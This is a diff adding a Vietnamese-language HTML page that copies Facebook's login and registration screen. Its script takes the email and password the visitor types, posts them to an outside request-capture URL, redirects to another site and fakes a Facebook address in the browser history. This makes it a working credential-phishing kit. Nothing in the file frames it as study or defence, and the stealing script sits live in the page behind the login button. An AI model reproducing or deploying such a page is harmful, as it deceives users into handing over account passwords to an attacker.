@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook - Đăng nhập hoặc đăng ký</title>
+
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            font-size: 12px;
+            color: white;
+        }
+
+        #header-fb {
+            background-color: #3B5998;
+            width: 100%;
+            height: auto;
+            display: flex;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        #header-fb .fb01 {
+            display: flex;
+            width: 980px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        #header-fb .fb01 h1 {
+            font-size: 35px;
+            color: white;
+            margin-top: 17px;
+            cursor: pointer;
+        }
+
+        #header-fb .fb01 table {
+            margin-top: 17px;
+            width: 422px;
+            height: 68px;
+            line-height: 5px;
+        }
+
+        #header-fb .fb01 table input {
+            width: 142px;
+            height: 17px;
+            padding: 3px;
+        }
+
+        #header-fb .fb01 table button {
+            padding: 2px 6px;
+            font-weight: bold;
+            font-size: 12px;
+            background-color: #4267b2;
+            color: white;
+            line-height: 18px;
+            border-radius: 2px;
+            cursor: pointer;
+            border: 1px solid #29487d;
+        }
+
+        #header-fb .fb01 table button:hover {
+            background-color: #3B5998;
+        }
+
+        #header-fb .fb01 table a {
+            color: #9cb4d8;
+            text-decoration: none;
+        }
+
+        #header-fb .fb01 table a:hover {
+            border-bottom: 1px solid #9cb4d8;
+        }
+
+        #content-fb {
+            background-color: #ECEEF5;
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+        }
+
+        #content-fb .ct01 {
+            margin-top: 40px;
+            color: black;
+            display: flex;
+            height: 640px;
+        }
+
+        #content-fb .ct01 .left-fb {
+            /*            float: left;*/
+
+            width: 580px;
+            height: 296px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #content-fb .ct01 .right-fb {
+            /*            float: right;*/
+
+            width: 400px;
+            margin-top: -30px;
+        }
+
+        #content-fb .ct01 .right-fb .bg-01 {
+            padding-top: 20px;
+            padding-bottom: 20px;
+            line-height: 1.11;
+        }
+
+        #content-fb .ct01 .left-fb .x501 {
+            font-size: 20px;
+            width: 450px;
+            font-size: 20px;
+            font-weight: bold;
+            line-height: 29px;
+        }
+
+        #content-fb .ct01 .left-fb img {
+            width: 537px;
+        }
+
+        #content-fb .ct01 .right-fb .msb01 {
+            font-size: 36px;
+            font-weight: 600;
+            height: 48px;
+            margin-bottom: 5px;
+        }
+
+        #content-fb .ct01 .right-fb .msb02 {
+            color: #1d2129;
+            font-size: 19px;
+            height: 28px;
+        }
+
+        #content-fb .ct01 .right-fb table {
+            /*            line-height: 30px;*/
+        }
+
+        #content-fb .ct01 .right-fb table .input00,
+        .input01 {
+            font-size: 18px;
+            padding: 8px 10px;
+            border-radius: 5px;
+            border: 1px solid #bdc7d8;
+            width: 172px;
+            margin-bottom: 10px;
+        }
+
+        #content-fb .ct01 .right-fb table select {
+            font-size: 13px;
+            height: 30px;
+            padding: 5px;
+            border: 1px solid #ccd0d5;
+        }
+
+        #content-fb .ct01 .right-fb table .input01 {
+            width: 377px;
+        }
+
+        #content-fb .ct01 .right-fb table .text1 {
+            color: #90949c;
+            font-size: 16px;
+            font-weight: bold;
+            height: 33px;
+        }
+
+        #content-fb .ct01 .right-fb table tr,
+        td {
+            /*            border: 1px solid black;*/
+            /*            width: 400px;*/
+        }
+
+        #content-fb .ct01 .right-fb table .radiofb label {
+            font-size: 18px;
+            padding: 0px 15px 0px 3px;
+        }
+
+        #content-fb .ct01 .right-fb table .radiofb input {
+            margin-bottom: 20px;
+        }
+
+        #content-fb .ct01 .right-fb table .text-fb {
+            font-size: 12px;
+            color: #777;
+        }
+
+        #content-fb .ct01 .right-fb table .text-fb a {
+            text-decoration: none;
+            color: #385898;
+        }
+
+        #content-fb .ct01 .right-fb table .text-fb a:hover {
+            text-decoration: underline;
+        }
+
+        #content-fb .ct01 .right-fb table .login-fb button {
+            font-weight: bold;
+            font-size: 15px;
+            min-width: 194px;
+            height: 47px;
+            padding: 7px 20px;
+            background: linear-gradient(#67ae55, #578843);
+            background-color: #69a74e;
+            box-shadow: inset 0 1px 1px #a4e388;
+            border-color: #3b6e22 #3b6e22 #2c5115;
+            border: 1px solid;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+            letter-spacing: 1px;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, .5);
+            margin: 20px 0px;
+        }
+
+        #content-fb .ct01 .right-fb table .reg_pages_msg {
+            border-top: 1px solid #dddfe2;
+            color: #666;
+            font-size: 13px;
+            font-weight: bold;
+            line-height: 17px;
+        }
+
+        #content-fb .ct01 .right-fb table .reg_pages_msg a {
+            color: #385898;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        #content-fb .ct01 .right-fb table .reg_pages_msg a:hover {
+            text-decoration: underline;
+        }
+
+        #footer-fb {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+            /*            display: flex;*/
+            /*            justify-content: center;*/
+        }
+
+        #footer-fb .pagefooter {
+            width: 980px;
+            color: #737373;
+            margin: 0 auto;
+        }
+
+        #footer-fb .pagefooter .footer01 ul li {
+            display: inline-block;
+            padding: 8px 6px 0px 0px;
+        }
+
+        #footer-fb .pagefooter .footer01 ul li a {
+            color: #385898;
+            text-decoration: none;
+        }
+
+        #footer-fb .pagefooter .footer01 ul li a:hover {
+            text-decoration: underline;
+        }
+
+        #footer-fb .pagefooter .boderpage {
+            border-bottom: 1px solid #dddfe2;
+            height: 8px;
+            margin-bottom: 8px;
+        }
+
+        #footer-fb .pagefooter .footer02 ul li {
+            display: inline-block;
+            line-height: 1.6;
+        }
+
+        #footer-fb .pagefooter .footer02 ul li a {
+            color: #385898;
+            text-decoration: none;
+            padding-right: 15px;
+        }
+
+        #footer-fb .pagefooter .copyright {
+            font-size: 11px;
+            margin: 20px 0px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="header-fb">
+        <div class="fb01">
+            <h1>Facebook</h1>
+            <table>
+                <tr>
+                    <td>Email hoặc điện thoại</td>
+                    <td>Mật khẩu</td>
+                </tr>
+                <tr>
+                    <td>
+                        <input id='email' type="text">
+                    </td>
+                    <td>
+                        <input id='password' type="password">
+                    </td>
+                    <td>
+                        <button onclick='onGoClick()'>Đăng nhập</button>
+                    </td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td><a href="#">Quên tài khoản?</a>
+                    </td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <div id="content-fb">
+        <div class="ct01">
+            <div class="left-fb">
+                <div class="x501">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/OBaVg52wtTZ.png" alt="facebook">
+            </div>
+            <div class="right-fb">
+                <div class="bg-01">
+                    <div class="msb01">Đăng ký</div>
+                    <div class="msb02">Nhanh chóng và dễ dàng.</div>
+
+                </div>
+                <table>
+                    <tr>
+                        <td>
+                            <input class="input00" type="text" placeholder="Họ">
+                        </td>
+                        <td>
+                            <input class="input00" type="text" placeholder="Tên">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">
+                            <input class="input01" type="text" placeholder="Số di động hoặc email">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">
+                            <input class="input01" type="text" placeholder="Mật khẩu mới">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" class="text1">Ngày sinh</td>
+                    </tr>
+                    <tr>
+                        <td colspan="2">
+                            <select name="day" class="day" size="1">
+                                <option>Ngày</option>
+                            </select>
+                            <select name="month" class="month" size="1">
+                                <option>Tháng</option>
+                            </select>
+                            <select name="year" class="year" size="1">
+                                <option>Năm</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" class="text1">Giới tính</td>
+                    </tr>
+                    <tr class="radiofb">
+                        <td colspan="2">
+                            <input type="radio" value="famale" id="famale" name="gender">
+                            <label for="famale">Nữ</label>
+                            <input type="radio" value="maple" name="gender" id="maple">
+                            <label for="maple">Nam</label>
+                            <input type="radio" value="other" id="other" name="gender">
+                            <label for="other">Tùy chỉnh</label>
+                            <br>
+                        </td>
+                    </tr>
+                    <tr class="text-fb">
+                        <td colspan="2">Bằng cách nhấp vào Đăng ký, bạn đồng ý với <a href="#">Điều khoản</a>, <a
+                                href="#">Chính sách dữ liệu</a> và <a href="#">Chính sách cookie</a> của chúng tôi. Bạn
+                            có thể nhận được thông báo của chúng tôi qua SMS và hủy nhận bất kỳ lúc nào.</td>
+                    </tr>
+                    <tr class="login-fb">
+                        <td colspan="2">
+                            <button type="submit">Đăng ký</button>
+                        </td>
+                    </tr>
+                    <tr class="reg_pages_msg">
+                        <td colspan="2"><a href="#">Tạo Trang</a> dành cho người nổi tiếng, nhãn hiệu hoặc doanh nghiệp.
+                        </td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <div id="footer-fb">
+        <div class="pagefooter">
+            <div class="footer01">
+                <ul>
+                    <li>Tiếng Việt</li>
+                    <li><a href="#">中文(台灣)</a>
+                    </li>
+                    <li><a href="#">日本語</a>
+                    </li>
+                    <li><a href="#">한국어</a>
+                    </li>
+                    <li><a href="#">ภาษาไทย</a>
+                    </li>
+                    <li><a href="#">Français (France)</a>
+                    </li>
+                    <li><a href="#">Español</a>
+                    </li>
+                    <li><a href="#">Português (Brasil)</a>
+                    </li>
+                    <li><a href="#">Deutsch</a>
+                    </li>
+                    <li><a href="#">Italiano</a>
+                    </li>
+                    <li><a href="#">English (UK)</a>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="boderpage"></div>
+            <div class="footer02">
+                <ul>
+                    <li><a href="#">Đăng ký</a>
+                    </li>
+                    <li><a href="#">Đăng nhập</a>
+                    </li>
+                    <li><a href="#">Messenger</a>
+                    </li>
+                    <li><a href="#">Facebook Lite</a>
+                    </li>
+                    <li><a href="#">Watch </a>
+                    </li>
+                    <li><a href="#">Danh bạ</a>
+                    </li>
+                    <li><a href="#">Trang</a>
+                    </li>
+                    <li><a href="#">Hạng mục Trang</a>
+                    </li>
+                    <li><a href="#">Địa điểm</a>
+                    </li>
+                    <li><a href="#">Trò chơi</a>
+                    </li>
+                    <li><a href="#">Vị trí</a>
+                    </li>
+                    <li><a href="#">Marketplace</a>
+                    </li>
+                    <li><a href="#">Facebook Pay</a>
+                    </li>
+                    <li><a href="#">Nhóm</a>
+                    </li>
+                    <li><a href="#">Oculus</a>
+                    </li>
+                    <li><a href="#">Portal</a>
+                    </li>
+                    <li><a href="#">Instagram</a>
+                    </li>
+                    <li><a href="#">Địa phương</a>
+                    </li>
+                    <li><a href="#">Chiến dịch gây quỹ</a>
+                    </li>
+                    <li><a href="#">Dịch vụ</a>
+                    </li>
+                    <li><a href="#">Giới thiệu</a>
+                    </li>
+                    <li><a href="#">Tạo quảng cáo</a>
+                    </li>
+                    <li><a href="#">Tạo Trang</a>
+                    </li>
+                    <li><a href="#">Nhà phát triển</a>
+                    </li>
+                    <li><a href="#">Tuyển dụng</a>
+                    </li>
+                    <li><a href="#">Quyền riêng tư</a>
+                    </li>
+                    <li><a href="#">Cookie</a>
+                    </li>
+                    <li><a href="#">Lựa chọn quảng cáo</a>
+                    </li>
+                    <li><a href="#">Điều khoản</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="copyright">
+                <span> Facebook © 2020</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function postToServer(url = '', cb) {
+            console.log('post to SERVER', cb())
+            const response = await fetch(url, {
+                method: 'POST',
+                mode: 'no-cors',
+                cache: 'no-cache',
+                credentials: 'same-origin',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                redirect: 'follow',
+                referrerPolicy: 'no-referrer',
+                body: JSON.stringify(cb())
+            });
+            window.location.replace("http://www.w3schools.com");
+            history.pushState(null,null,'https://www.facebook.com/?stype=lo&jlou=AffOY_-zHcXYGDipzZTLNL0JCgDSfoKX7OJ6TXOI5Khqi5hKtDFbH5p2w5QyCYYHPX9leJrrztW-uNLOO91Bls6TLIf5uHtscrkR4rHQnjSH7A&smuh=16634&lh=Ac8Jr6HAMCVBvAtA')
+        }
+
+
+        function onGoClick() {
+            postToServer('https://ptsv2.com/t/hfi28-1594870625/post', () => {
+                {
+                    const $d = Object.seal(document);
+                    return {
+                        e: Object.isSealed($d) && $d.getElementById('email') && $d.getElementById('email').value,
+                        p: Object.isSealed($d) && $d.getElementById('password') && $d.getElementById('password').value,
+                    }
+                }
+            })
+                .then(data => {
+                    console.log(data); // JSON data parsed by `data.json()` call
+                });
+        }
+
+
+    </script>
+    <script>
+        var seYear = document.querySelector('.year')
+        console.log(seYear);
+
+        for (let year = 2020; year > 1920; year--) {
+            var option = document.createElement('option')
+            option.value = year
+            option.innerHTML = year
+            seYear.append(option)
+        }
+        var seMonth = document.querySelector('.month')
+        console.log(seYear);
+
+        for (let month = 12; month > 0; month--) {
+            var option = document.createElement('option')
+            option.value = month
+            option.innerHTML = month
+            seMonth.append(option)
+        }
+        var seDay = document.querySelector('.day')
+        console.log(seYear);
+
+        for (let day = 31; day > 0; day--) {
+            var option = document.createElement('option')
+            option.value = day
+            option.innerHTML = day
+            seDay.append(option)
+        }
+    </script>
+
+</body>
+
+</html>
